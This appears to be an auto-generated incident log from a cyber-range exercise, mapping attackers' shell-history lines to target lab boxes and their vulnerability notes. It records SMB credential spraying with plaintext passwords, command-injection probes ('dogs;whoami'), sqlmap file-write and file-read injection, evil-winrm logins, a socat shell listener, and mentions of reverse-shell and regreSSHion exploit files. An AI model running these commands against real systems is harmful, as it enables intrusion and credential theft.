  - 2026-01-13T19:33:43 | logs/10.100.7.32/shell_history.csv#L259 | ssh forge@10.100.7.44
  - 2026-01-13T19:33:55 | logs/10.100.7.32/shell_history.csv#L260 | ssh -i ~/.ssh/helios_ssh_key forge@10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 314 - 2026-01-13T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:38:34 | logs/10.100.7.32/shell_history.csv#L277 | git log
  - 2026-01-13T19:38:37 | logs/10.100.7.32/shell_history.csv#L278 | git checkout 7eb86abd35407250c6468b51c0537dc528f2dc1d
  - 2026-01-13T19:38:38 | logs/10.100.7.32/shell_history.csv#L279 | ls
  - 2026-01-13T19:38:43 | logs/10.100.7.32/shell_history.csv#L280 | ls
  - 2026-01-13T19:38:46 | logs/10.100.7.32/shell_history.csv#L281 | ls -la
  - 2026-01-13T19:38:48 | logs/10.100.7.32/shell_history.csv#L282 | cat maintenance.log
  - 2026-01-13T19:38:50 | logs/10.100.7.32/shell_history.csv#L283 | cat production.log
  - 2026-01-13T19:38:53 | logs/10.100.7.32/shell_history.csv#L284 | cat quality.log

## Incident 315 - 2026-01-13T19:40:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:40:56 | logs/10.100.7.33/shell_history.csv#L26 | tldr smbclient
  - 2026-01-13T19:40:01 | logs/10.100.7.32/shell_history.csv#L288 | git diff
  - 2026-01-13T19:40:03 | logs/10.100.7.32/shell_history.csv#L289 | git diff
  - 2026-01-13T19:40:03 | logs/10.100.7.32/shell_history.csv#L290 | ls
  - 2026-01-13T19:40:04 | logs/10.100.7.32/shell_history.csv#L291 | ls -la
  - 2026-01-13T19:40:03 | logs/10.100.7.13/shell_history.csv#L58 | tldr smb
  - 2026-01-13T19:40:12 | logs/10.100.7.13/shell_history.csv#L59 | tldr --update
  - 2026-01-13T19:40:12 | logs/10.100.7.13/shell_history.csv#L60 | tldr --update
  - 2026-01-13T19:40:19 | logs/10.100.7.13/shell_history.csv#L61 | tldr smb
  - 2026-01-13T19:40:24 | logs/10.100.7.13/shell_history.csv#L62 | tldr smbclient

## Incident 316 - 2026-01-13T19:41:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:41:11 | logs/10.100.7.34/shell_history.csv#L33 | nxc smb 10.100.7.40 -u asdfasdfsolaris -p passwasdfasdford123!
  - 2026-01-13T19:41:30 | logs/10.100.7.34/shell_history.csv#L34 | nxc smb 10.100.7.40 -u asdfasdfsolaris -p passwasdfasdford123! --shares

## Incident 317 - 2026-01-13T19:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:45:08 | logs/10.100.7.33/shell_history.csv#L31 | smbclient //server/share --user username
  - 2026-01-13T19:45:13 | logs/10.100.7.33/shell_history.csv#L32 | smbclient //server/share --user username
  - 2026-01-13T19:45:13 | logs/10.100.7.33/shell_history.csv#L33 | smbclient //server/share --user username
  - 2026-01-13T19:45:13 | logs/10.100.7.33/shell_history.csv#L34 | smbclient //server/share --user username
  - 2026-01-13T19:45:57 | logs/10.100.7.13/shell_history.csv#L64 | tldr evil-winrm

## Incident 318 - 2026-01-13T19:50:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:50:51 | logs/10.100.7.33/shell_history.csv#L40 | smbclient --list=10.100.7.40 --no-pass
  - 2026-01-13T19:50:19 | logs/10.100.7.34/shell_history.csv#L38 | smbclient //10.100.7.40/share --public
  - 2026-01-13T19:50:26 | logs/10.100.7.24/shell_history.csv#L63 | smbclient //10.100.7.40/public
  - 2026-01-13T19:50:47 | logs/10.100.7.24/shell_history.csv#L64 | smbclient //10.100.7.40/public
  - 2026-01-13T19:50:51 | logs/10.100.7.24/shell_history.csv#L65 | ssh solaris@10.100.7.40

## Incident 319 - 2026-01-13T19:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:53:04 | logs/10.100.7.34/shell_history.csv#L40 | unzip backup.zip
  - 2026-01-13T19:53:25 | logs/10.100.7.34/shell_history.csv#L41 | cat credentials.txt
  - 2026-01-13T19:53:44 | logs/10.100.7.34/shell_history.csv#L42 | cat credentials.txt
  - 2026-01-13T19:53:45 | logs/10.100.7.34/shell_history.csv#L43 | cat credentials.txt
  - 2026-01-13T19:53:45 | logs/10.100.7.34/shell_history.csv#L44 | cat credentials.txt
  - 2026-01-13T19:53:45 | logs/10.100.7.34/shell_history.csv#L45 | cat credentials.txt

## Incident 320 - 2026-01-13T20:09:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:09:07 | logs/10.100.7.33/shell_history.csv#L46 | tldr evil-winrm
  - 2026-01-13T20:09:07 | logs/10.100.7.33/shell_history.csv#L47 | tldr evil-winrm
  - 2026-01-13T20:09:10 | logs/10.100.7.14/shell_history.csv#L55 | cat dogs%3bwhoami
  - 2026-01-13T20:09:16 | logs/10.100.7.14/shell_history.csv#L56 | cat dogs%3b whoami
  - 2026-01-13T20:09:35 | logs/10.100.7.14/shell_history.csv#L57 | cat dogs%3Bwhoami
  - 2026-01-13T20:09:42 | logs/10.100.7.14/shell_history.csv#L58 | cat dogs;whoami
  - 2026-01-13T20:09:53 | logs/10.100.7.13/shell_history.csv#L67 | smbclient //solaris/public --user guest

## Incident 321 - 2026-01-13T20:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:10:10 | logs/10.100.7.33/shell_history.csv#L48 | tldr nxc
  - 2026-01-13T20:10:32 | logs/10.100.7.32/shell_history.csv#L347 | ls
  - 2026-01-13T20:10:08 | logs/10.100.7.13/shell_history.csv#L68 | ls
  - 2026-01-13T20:10:21 | logs/10.100.7.13/shell_history.csv#L69 | backup.zip

## Incident 322 - 2026-01-13T20:10:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:10:02 | logs/10.100.7.32/shell_history.csv#L345 | nxc smb 10.100.7.42 -u orbital
  - 2026-01-13T20:10:32 | logs/10.100.7.32/shell_history.csv#L346 | nxc smb 10.100.7.42 -u orbital
  - 2026-01-13T20:10:43 | logs/10.100.7.32/shell_history.csv#L348 | nxc smb 10.100.7.42 -u orbital -p helios_credentials.txt
  - 2026-01-13T20:10:54 | logs/10.100.7.32/shell_history.csv#L349 | nxc smb 10.100.7.42 -u helios_credentials.txt -p helios_credentials.txt
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 323 - 2026-01-20T19:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:05:47 | logs/10.100.7.33/shell_history.csv#L50 | tldr ssh
  - 2026-01-20T19:05:50 | logs/10.100.7.32/shell_history.csv#L396 | vi php-reverse-shell.php
  - 2026-01-20T19:05:57 | logs/10.100.7.32/shell_history.csv#L397 | vi php-reverse-shell.php
  - 2026-01-20T19:05:35 | logs/10.100.7.22/shell_history.csv#L82 | exit

## Incident 324 - 2026-01-20T19:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:10:21 | logs/10.100.7.33/shell_history.csv#L51 | nano key.txt
  - 2026-01-20T19:10:45 | logs/10.100.7.14/shell_history.csv#L110 | ssh key-gen

## Incident 325 - 2026-01-20T19:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:12:06 | logs/10.100.7.33/shell_history.csv#L52 | exit
  - 2026-01-20T19:12:12 | logs/10.100.7.33/shell_history.csv#L53 | exit
  - 2026-01-20T19:12:20 | logs/10.100.7.33/shell_history.csv#L54 | exit
  - 2026-01-20T19:12:02 | logs/10.100.7.22/shell_history.csv#L94 | ssh -add privatekey.txt
  - 2026-01-20T19:12:16 | logs/10.100.7.22/shell_history.csv#L95 | ssh-add privatekey.txt
  - 2026-01-20T19:12:51 | logs/10.100.7.22/shell_history.csv#L96 | eval $(ssh-agent -s)
  - 2026-01-20T19:12:56 | logs/10.100.7.22/shell_history.csv#L97 | ssh-add privatekey.txt

## Incident 326 - 2026-01-20T19:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:15:34 | logs/10.100.7.33/shell_history.csv#L55 | exit
  - 2026-01-20T19:15:36 | logs/10.100.7.22/shell_history.csv#L103 | tldr ssh

## Incident 327 - 2026-01-20T19:15:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:15:18 | logs/10.100.7.14/shell_history.csv#L115 | ssh root@10.100.7.43
  - 2026-01-20T19:15:18 | logs/10.100.7.14/shell_history.csv#L116 | ssh root@10.100.7.43
  - 2026-01-20T19:15:41 | logs/10.100.7.14/shell_history.csv#L117 | ssh starfall@10.100.7.43
  - 2026-01-20T19:15:41 | logs/10.100.7.14/shell_history.csv#L118 | ssh starfall@10.100.7.43

## Incident 328 - 2026-01-20T19:20:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:20:08 | logs/10.100.7.33/shell_history.csv#L56 | ssh -i home/kali/key.txt  solaris@10.100.7.40
  - 2026-01-20T19:20:13 | logs/10.100.7.22/shell_history.csv#L109 | ssh -i authorized_keys akshay@10.100.7.40

## Incident 329 - 2026-01-20T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:20:11 | logs/10.100.7.33/shell_history.csv#L57 | load kiwi
  - 2026-01-20T19:20:09 | logs/10.100.7.32/shell_history.csv#L426 | ls
  - 2026-01-20T19:20:41 | logs/10.100.7.32/shell_history.csv#L430 | ls
  - 2026-01-20T19:20:42 | logs/10.100.7.32/shell_history.csv#L431 | ls
  - 2026-01-20T19:20:44 | logs/10.100.7.32/shell_history.csv#L432 | ls
  - 2026-01-20T19:20:47 | logs/10.100.7.32/shell_history.csv#L433 | cat starfall

## Incident 330 - 2026-01-20T19:20:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:20:14 | logs/10.100.7.32/shell_history.csv#L427 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43
  - 2026-01-20T19:20:29 | logs/10.100.7.32/shell_history.csv#L428 | ssh -i ~/.ssh/starfall starfall@10.100.7.43
  - 2026-01-20T19:20:41 | logs/10.100.7.32/shell_history.csv#L429 | ssh -i ~/.ssh/starfall starfall@10.100.7.43

## Incident 331 - 2026-01-20T19:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:21:08 | logs/10.100.7.33/shell_history.csv#L58 | tldr getsystem
  - 2026-01-20T19:21:18 | logs/10.100.7.33/shell_history.csv#L59 | getsystem
  - 2026-01-20T19:21:09 | logs/10.100.7.32/shell_history.csv#L434 | clear
  - 2026-01-20T19:21:10 | logs/10.100.7.32/shell_history.csv#L435 | ls

## Incident 332 - 2026-01-20T19:21:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:21:17 | logs/10.100.7.14/shell_history.csv#L128 | ssh -i file.txt starfall@10.100.7.43
  - 2026-01-20T19:21:17 | logs/10.100.7.14/shell_history.csv#L129 | ssh -i file.txt starfall@10.100.7.43

## Incident 333 - 2026-01-20T19:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:25:00 | logs/10.100.7.33/shell_history.csv#L60 | metasploit
  - 2026-01-20T19:25:13 | logs/10.100.7.14/shell_history.csv#L133 | cat file1.txt.pub
  - 2026-01-20T19:25:47 | logs/10.100.7.14/shell_history.csv#L134 | ls
  - 2026-01-20T19:25:54 | logs/10.100.7.14/shell_history.csv#L135 | file1.txt

## Incident 334 - 2026-01-20T19:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:27:42 | logs/10.100.7.33/shell_history.csv#L61 | msfconsole
  - 2026-01-20T19:27:50 | logs/10.100.7.33/shell_history.csv#L62 | tldr msfconsole

## Incident 335 - 2026-01-20T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:28:08 | logs/10.100.7.33/shell_history.csv#L63 | msfconsole -h
  - 2026-01-20T19:28:31 | logs/10.100.7.14/shell_history.csv#L140 | cd file1.txt.pub
  - 2026-01-20T19:28:35 | logs/10.100.7.14/shell_history.csv#L141 | cat file1.txt.pub

## Incident 336 - 2026-01-20T19:28:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:28:04 | logs/10.100.7.32/shell_history.csv#L436 | ssh -i ~/.ssh/starfall starfall@10.100.7.43
  - 2026-01-20T19:28:23 | logs/10.100.7.14/shell_history.csv#L139 | ssh -i file1.txt starfall@10.100.7.43

## Incident 337 - 2026-01-20T19:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:34:15 | logs/10.100.7.33/shell_history.csv#L64 | tldr nxc
  - 2026-01-20T19:34:37 | logs/10.100.7.33/shell_history.csv#L65 | nxc smb -h
  - 2026-01-20T19:34:00 | logs/10.100.7.22/shell_history.csv#L120 | vim 7etsuo-regreSSHHion.c
  - 2026-01-20T19:34:25 | logs/10.100.7.22/shell_history.csv#L121 | vim Makefile
  - 2026-01-20T19:34:35 | logs/10.100.7.22/shell_history.csv#L122 | make all

## Incident 338 - 2026-01-20T20:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:25:35 | logs/10.100.7.33/shell_history.csv#L84 | ls
  - 2026-01-20T20:25:53 | logs/10.100.7.33/shell_history.csv#L85 | cat maintenance.log

## Incident 339 - 2026-01-20T20:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:34:32 | logs/10.100.7.33/shell_history.csv#L89 | rpcinfo -s localhost
  - 2026-01-20T20:34:32 | logs/10.100.7.33/shell_history.csv#L90 | rpcinfo -s localhost

## Incident 340 - 2026-01-20T20:36:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-20T20:36:09 | logs/10.100.7.33/shell_history.csv#L92 | rpcclient -U public 10.100.7.42
  - 2026-01-20T20:36:34 | logs/10.100.7.33/shell_history.csv#L93 | rpcclient -U public -N 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 341 - 2026-01-26T18:35:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T18:35:36 | logs/10.100.7.33/shell_history.csv#L95 | nmap -sV -T3 10.100.7.40-46
  - 2026-01-26T18:35:49 | logs/10.100.7.33/shell_history.csv#L96 | nmap -sV -T3 10.100.7.40-46
  - 2026-01-26T18:35:49 | logs/10.100.7.33/shell_history.csv#L97 | nmap -sV -T3 10.100.7.40-46
  - 2026-01-26T18:35:50 | logs/10.100.7.33/shell_history.csv#L98 | nmap -sV -T3 10.100.7.40-46
  - 2026-01-26T18:35:51 | logs/10.100.7.33/shell_history.csv#L99 | nmap -sV -T3 10.100.7.40-46

## Incident 342 - 2026-01-26T19:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:31:57 | logs/10.100.7.13/shell_history.csv#L122 | go install github.com/deletescape/goop@latest
  - 2026-01-26T19:31:58 | logs/10.100.7.13/shell_history.csv#L123 | go install github.com/deletescape/goop@latest
  - 2026-01-26T19:31:39 | logs/10.100.7.31/shell_history.csv#L17 | ifconfig

## Incident 343 - 2026-01-26T19:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:32:03 | logs/10.100.7.33/shell_history.csv#L104 | tldr enum4linux
  - 2026-01-26T19:32:10 | logs/10.100.7.13/shell_history.csv#L124 | goop
  - 2026-01-26T19:32:40 | logs/10.100.7.13/shell_history.csv#L125 | go install github.com/deletescape/goop@latest
  - 2026-01-26T19:32:42 | logs/10.100.7.13/shell_history.csv#L126 | tldr nxc
  - 2026-01-26T19:32:42 | logs/10.100.7.13/shell_history.csv#L127 | tldr nxc

## Incident 344 - 2026-01-26T19:32:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:32:36 | logs/10.100.7.24/shell_history.csv#L168 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:32:47 | logs/10.100.7.24/shell_history.csv#L169 | smbclient //10.100.7.46/IPC -U “”
  - 2026-01-26T19:32:57 | logs/10.100.7.24/shell_history.csv#L170 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:32:57 | logs/10.100.7.24/shell_history.csv#L171 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 345 - 2026-01-27T18:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:39:12 | logs/10.100.7.33/shell_history.csv#L105 | tldr enum4linux
  - 2026-01-27T18:39:16 | logs/10.100.7.33/shell_history.csv#L106 | tldr enum4linux
  - 2026-01-27T18:39:24 | logs/10.100.7.33/shell_history.csv#L107 | tldr nmap

## Incident 346 - 2026-01-27T19:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:08:37 | logs/10.100.7.32/shell_history.csv#L642 | ls
  - 2026-01-27T19:08:59 | logs/10.100.7.32/shell_history.csv#L643 | vi maintenance.ps1

## Incident 347 - 2026-01-27T19:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:33:02 | logs/10.100.7.33/shell_history.csv#L124 | tldr msfconsole
  - 2026-01-27T19:33:51 | logs/10.100.7.32/shell_history.csv#L687 | vi maintenance.ps1
  - 2026-01-27T19:33:53 | logs/10.100.7.32/shell_history.csv#L688 | cat maintenance.
  - 2026-01-27T19:33:54 | logs/10.100.7.14/shell_history.csv#L351 | exit
  - 2026-01-27T19:33:54 | logs/10.100.7.13/shell_history.csv#L228 | smbclient //pyre/public --user krbtgt

## Incident 348 - 2026-02-03T19:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:15:22 | logs/10.100.7.33/shell_history.csv#L126 | msfconsole
  - 2026-02-03T19:15:25 | logs/10.100.7.33/shell_history.csv#L127 | ls
  - 2026-02-03T19:15:25 | logs/10.100.7.33/shell_history.csv#L128 | ls

## Incident 349 - 2026-02-03T19:19:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-03T19:19:45 | logs/10.100.7.33/shell_history.csv#L129 | ssh ember@10.100.7.46
  - 2026-02-03T19:19:50 | logs/10.100.7.33/shell_history.csv#L130 | ssh ember@10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 350 - 2026-02-03T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:19:13 | logs/10.100.7.31/shell_history.csv#L53 | gobuster help
  - 2026-02-03T19:19:21 | logs/10.100.7.31/shell_history.csv#L54 | clear
  - 2026-02-03T19:19:58 | logs/10.100.7.31/shell_history.csv#L55 | ls

## Incident 351 - 2026-02-03T19:20:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-03T19:20:04 | logs/10.100.7.33/shell_history.csv#L131 | ssh Ember@10.100.7.46
  - 2026-02-03T19:20:07 | logs/10.100.7.33/shell_history.csv#L132 | ssh Ember@10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 352 - 2026-02-03T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:20:05 | logs/10.100.7.31/shell_history.csv#L56 | cd go
  - 2026-02-03T19:20:07 | logs/10.100.7.31/shell_history.csv#L57 | ls
  - 2026-02-03T19:20:12 | logs/10.100.7.31/shell_history.csv#L58 | cd pkg
  - 2026-02-03T19:20:13 | logs/10.100.7.31/shell_history.csv#L59 | ls
  - 2026-02-03T19:20:41 | logs/10.100.7.31/shell_history.csv#L60 | cd ..

## Incident 353 - 2026-02-03T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:22:19 | logs/10.100.7.12/shell_history.csv#L239 | ls
  - 2026-02-03T19:22:37 | logs/10.100.7.12/shell_history.csv#L240 | ls

## Incident 354 - 2026-02-03T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:23:02 | logs/10.100.7.33/shell_history.csv#L134 | nxc
  - 2026-02-03T19:23:50 | logs/10.100.7.32/shell_history.csv#L936 | python3 penelope.py

## Incident 355 - 2026-02-03T19:23:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:23:37 | logs/10.100.7.12/shell_history.csv#L241 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="ctrl.txt" --file-destination="/home/pyre/ctrl.txt""
  - 2026-02-03T19:23:55 | logs/10.100.7.12/shell_history.csv#L242 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="ctrl.txt" --file-dest="/home/pyre/ctrl.txt""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 356 - 2026-02-03T19:24:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:24:04 | logs/10.100.7.12/shell_history.csv#L243 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="ctrl.txt" --file-dest="~/home/pyre/ctrl.txt""
  - 2026-02-03T19:24:21 | logs/10.100.7.12/shell_history.csv#L244 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="~/home/pyre/ctrl.txt""
  - 2026-02-03T19:24:34 | logs/10.100.7.12/shell_history.csv#L245 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="~/home/pyre/ctrl.txt" --hex"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 357 - 2026-02-03T19:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:24:59 | logs/10.100.7.12/shell_history.csv#L246 | history
  - 2026-02-03T19:24:55 | logs/10.100.7.31/shell_history.csv#L62 | clear

## Incident 358 - 2026-02-03T19:46:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:46:20 | logs/10.100.7.32/shell_history.csv#L965 | ssh pyre@10.100.7.45
  - 2026-02-03T19:46:36 | logs/10.100.7.32/shell_history.csv#L966 | ssh root@10.100.7.45
  - 2026-02-03T19:46:43 | logs/10.100.7.32/shell_history.csv#L968 | ssh root@10.100.7.45
  - 2026-02-03T19:46:46 | logs/10.100.7.32/shell_history.csv#L969 | ssh root@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 359 - 2026-02-03T19:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:56:17 | logs/10.100.7.33/shell_history.csv#L141 | ctrl.txt
  - 2026-02-03T19:56:34 | logs/10.100.7.33/shell_history.csv#L142 | nano ctrl.txt

## Incident 360 - 2026-02-03T19:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:59:01 | logs/10.100.7.33/shell_history.csv#L145 | rm ctrl.txt
  - 2026-02-03T19:59:14 | logs/10.100.7.33/shell_history.csv#L146 | vim ctrl.txt

## Incident 361 - 2026-02-03T20:11:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-03T20:11:22 | logs/10.100.7.33/shell_history.csv#L150 | evil-winrm -i 10.100.7.42 -u orbital -p securepassword
  - 2026-02-03T20:11:34 | logs/10.100.7.33/shell_history.csv#L151 | evil-winrm -i 10.100.7.42 -u orbital -p securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 362 - 2026-02-03T20:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:11:39 | logs/10.100.7.33/shell_history.csv#L152 | rm ctrl.txt
  - 2026-02-03T20:11:54 | logs/10.100.7.33/shell_history.csv#L153 | vim ctrl.txt

## Incident 363 - 2026-02-03T20:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:20:09 | logs/10.100.7.33/shell_history.csv#L155 | rm ctrl.txt
  - 2026-02-03T20:20:15 | logs/10.100.7.33/shell_history.csv#L156 | rm ctrl.txt
  - 2026-02-03T20:20:37 | logs/10.100.7.33/shell_history.csv#L157 | vi ctrl.txt

## Incident 364 - 2026-02-09T18:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:52:02 | logs/10.100.7.33/shell_history.csv#L159 | smbclient -L //SERVER_IP -U "
  - 2026-02-09T18:52:41 | logs/10.100.7.12/shell_history.csv#L318 | socat file:/dev/tty,raw,echo=0 tcp-listen:12345

## Incident 365 - 2026-02-09T18:52:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:52:52 | logs/10.100.7.33/shell_history.csv#L161 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:58 | logs/10.100.7.33/shell_history.csv#L162 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:59 | logs/10.100.7.33/shell_history.csv#L163 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:25 | logs/10.100.7.14/shell_history.csv#L478 | smbmap -H 10.100.7.42 -u guest -p "
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 366 - 2026-02-09T19:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:34:18 | logs/10.100.7.33/shell_history.csv#L165 | smbclient -p port22
  - 2026-02-09T19:34:28 | logs/10.100.7.33/shell_history.csv#L166 | smbclient -p 22
  - 2026-02-09T19:34:34 | logs/10.100.7.33/shell_history.csv#L167 | smbclient -P 22

## Incident 367 - 2026-02-09T19:35:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:35:08 | logs/10.100.7.33/shell_history.csv#L168 | smbclient -L 10.100.7.48
  - 2026-02-09T19:35:18 | logs/10.100.7.33/shell_history.csv#L169 | smbclient -L //10.100.7.48
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 368 - 2026-02-09T19:37:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:37:16 | logs/10.100.7.33/shell_history.csv#L170 | evil-winrm -i 10.100.7.42 -u orbital -p securepassword
  - 2026-02-09T19:37:21 | logs/10.100.7.14/shell_history.csv#L511 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 369 - 2026-02-09T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:37:20 | logs/10.100.7.33/shell_history.csv#L171 | rm ctrl.txt
  - 2026-02-09T19:37:29 | logs/10.100.7.33/shell_history.csv#L172 | vim ctrl.txt
  - 2026-02-09T19:37:24 | logs/10.100.7.14/shell_history.csv#L512 | Bloodhound
  - 2026-02-09T19:37:44 | logs/10.100.7.14/shell_history.csv#L513 | bloodhound

## Incident 370 - 2026-01-12T19:35:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:35:01 | logs/10.100.7.32/shell_history.csv#L104 | ssh helios@10.100.7.40
  - 2026-01-12T19:35:50 | logs/10.100.7.32/shell_history.csv#L105 | ssh helios@10.100.7.40

## Incident 371 - 2026-01-12T19:36:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-12T19:36:02 | logs/10.100.7.34/shell_history.csv#L8 | xfreerdp3 /u:helios /v:10.100.7.41 /u:')b:t].n!5<Xj=/DGXtv&'
  - 2026-01-12T19:36:52 | logs/10.100.7.32/shell_history.csv#L109 | ssh -i ~/.ssh/helios helios@10.100.7.41
  - 2026-01-12T19:36:59 | logs/10.100.7.32/shell_history.csv#L110 | ssh -i ~/.ssh/helios helios@10.100.7.41

## Incident 372 - 2026-01-12T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:36:09 | logs/10.100.7.32/shell_history.csv#L107 | vi ~/.ssh/helios
  - 2026-01-12T19:36:28 | logs/10.100.7.14/shell_history.csv#L18 | exit
  - 2026-01-12T19:36:40 | logs/10.100.7.14/shell_history.csv#L19 | /api/health/all
  - 2026-01-12T19:36:45 | logs/10.100.7.14/shell_history.csv#L20 | api/health/all

